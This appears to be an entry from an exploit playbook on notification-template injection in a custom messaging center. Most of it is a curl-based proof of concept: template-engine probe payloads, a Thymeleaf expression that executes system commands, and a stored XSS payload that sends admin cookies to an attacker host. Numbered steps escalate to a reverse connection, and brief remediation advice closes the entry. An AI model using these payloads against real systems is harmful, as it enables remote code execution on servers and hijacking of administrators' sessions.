---
title: Notification template injection (unescaped title/body templates → SSTI / stored XSS)
cve: None (implementation flaw)
severity: critical
cvss: 9.0
product: Custom messaging center (in-app message/email/SMS templates)
versions: Any
ports: 80, 443
keywords: template, ssti, notification, in-app message, SMS, injection
entry: Admin template editor / member-defined notification titles
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

```
POST /api/admin/message/template  {"title":"${...}","content":"..."}
POST /api/user/notify/test        Member-side features such as "custom reminders"
```

## Prerequisites

- Ability to edit templates (with low-privilege admin access or an authorization bypass), or control variables within them.

## PoC

```bash
# 1) Probe template expressions (try Thymeleaf/Freemarker/Velocity individually)
for p in '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}' '$!{7*7}'; do
  curl -s -X POST https://target/api/admin/message/template -H "Authorization: Bearer <t>" \
    -H 'Content-Type: application/json' -d "{\"title\":\"t$p\",\"content\":\"c\"}" -o /dev/null
  curl -s https://target/api/user/messages -H "Authorization: Bearer <t>" | grep -o 't[0-9*+]*' | head -3
done
# Confirmation: 49 in the output = the template engine does not escape the expression (SSTI)

# 2) SSTI → RCE (Thymeleaf example)
#   __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
```

```bash
# 3) If input only reaches HTML without expression evaluation: stored XSS against support/admin users
curl -s -X POST https://target/api/admin/message/template -H "Authorization: Bearer <t>" \
  -d '{"title":"<img src=x onerror=fetch(\"//attacker/c?\"+document.cookie)>","content":"x"}'
```

## Exploitation Steps

1. First use the 7*7 variants to identify the engine and check escaping;
2. If successful, switch to `id` output, then to a reverse connection;
3. If RCE is unavailable, use stored XSS against the admin review page;
4. Evidence: the template-save response + output in the message list.

## Remediation and Mitigation

- Escape all template variables; restrict template editing to superadmins and audit it;
- Disable expression evaluation in the template engine (for example, turn off `spring.thymeleaf.enable-spring-el-compiler` in Thymeleaf).

## References

- OWASP SSTI prevention cheat sheet; CWE-1336.
